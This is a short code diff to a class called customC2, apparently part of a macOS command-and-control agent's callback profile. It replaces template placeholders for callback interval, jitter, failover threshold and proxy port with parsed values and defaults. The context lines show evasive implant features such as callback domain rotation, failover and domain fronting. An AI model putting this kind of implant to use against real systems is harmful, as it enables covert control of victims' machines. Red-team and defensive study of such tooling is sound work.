@@ -10,16 +10,16 @@ class customC2 extends baseC2 {
         // Multiple callback domains
         this.domains = baseurl.split(",").map(s => s.trim()).filter(s => s.length > 0);
         this.domainRotation = "domain_rotation";
-        this.failoverThreshold = failover_threshold;
+        this.failoverThreshold = parseInt("failover_threshold") || 5;
         this.failureCount = 0;
         this.currentDomainIndex = 0;
 
-        this.interval = callback_interval;
-        this.jitter = callback_jitter;
+        this.interval = parseInt("callback_interval") || 10;
+        this.jitter = parseFloat("callback_jitter") || 23;
 
         // Proxy
         this.proxyHost = "proxy_host";
-        this.proxyPort = proxy_port;
+        this.proxyPort = parseInt("proxy_port") || 0;
         this.proxyUser = "proxy_user";
         this.proxyPass = "proxy_pass";
         this.domainFront = "domain_front";
@@ -639,4 +639,4 @@ class customC2 extends baseC2 {
 
 //------------- INSTANTIATE -----------------------
 ObjC.import('Security');
-var C2 = new customC2(callback_interval, "callback_domains");
+var C2 = new customC2(parseInt("callback_interval") || 10, "callback_domains");
